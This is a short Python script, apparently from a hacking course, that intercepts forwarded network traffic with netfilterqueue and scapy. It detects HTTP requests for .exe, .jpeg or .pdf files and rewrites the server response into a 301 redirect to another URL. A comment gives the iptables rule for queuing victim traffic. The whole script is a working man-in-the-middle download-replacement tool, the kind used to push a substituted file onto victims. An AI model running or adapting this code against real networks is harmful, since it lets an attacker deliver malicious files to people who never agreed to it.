import netfilterqueue as net
import scapy.all as scapy


file_formats = [".exe", ".jpeg", ".pdf"]
ack_list = []
def process_packet(packet):
    scapy_packets = scapy.IP(packet.get_payload())
    tcp_packet = scapy_packets[scapy.TCP]
    if scapy_packets.haslayer(scapy.RAW): # all http packets
        if tcp_packet.dport == 80:
            print("HTTP Request:")
            for format in file_formats:
                if format in scapy_packets[scapy.RAW].load:
                    ack_list.append(tcp_packet.ack)
                    print("[+] Download Request:")

        elif tcp_packet.sport == 80:
            seq = tcp_packet.seq
            if seq in ack_list:
                ack_list.remove(seq)
                print("HTTP Response:")
                scapy_packets[
                    scapy.RAW].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp"
                # http 301
                del scapy_packets[scapy.IP].len
                del scapy_packets[scapy.IP].chksum
                del tcp_packet.chksum
                packet.set_payload(str(scapy_packets))
    packet.accept()
    """
    packet.accept()  # the packet will be sent to the target
    packet.drop()  #drop the packet at here
    """
    # iptables -I FORWARD -j NFQUEUE --queue-num 0


queue = net.NetfilterQueue()
queue.bind(0, process_packet)
# connect the queue created in system and call back
# the function process_packet
queue.run()
